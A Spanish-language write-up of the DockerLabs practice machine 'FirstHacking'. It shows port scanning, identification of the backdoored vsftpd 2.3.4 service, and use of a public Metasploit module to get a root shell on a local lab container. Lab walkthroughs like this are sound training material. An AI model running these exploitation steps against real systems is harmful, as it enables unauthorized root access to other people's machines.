# 🖥️ Writeup - FirstHacking 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

> **Tags:** `Linux` `FTP` `Metasploit` `Searchsploit` `Backdoor` `RCE`

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip firsthacking.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh firsthacking.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p21 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 18:04 CEST
Nmap scan report for 172.17.0.2
Host is up (0.0000060s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds
```
Vemos que solo el puerto `21` (`FTP`) está abierto y que la versión de `vsftpd` que corre es la `2.3.4`.

Esta versión en concreto es vulnerable a `Backdoor Command Execution`, como podemos comprobar tras utilizar `searchsploit`.

Info:
```
----------------------------------------- ---------------------------------
 Exploit Title                           |  Path
----------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
----------------------------------------- ---------------------------------
```

Abrimos `Metasploit` y empleamos el módulo de explotación para `vsftpd 2.3.4`.

```js
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 172.17.0.2
run
```

Info:
```
[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - USER: 331 Please specify the password.
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.17.0.1:46523 -> 172.17.0.2:6200) at 2025-09-11 18:10:10 +0200
```

Obtenemos una `command shell` y verificamos qué privilegios tenemos.

```bash
/bin/bash -i
whoami
```

Info:
```
root@0cc78b8316b6:~/vsftpd-2.3.4# whoami
root
root@0cc78b8316b6:~/vsftpd-2.3.4#
```

Ya estamos como usuario root!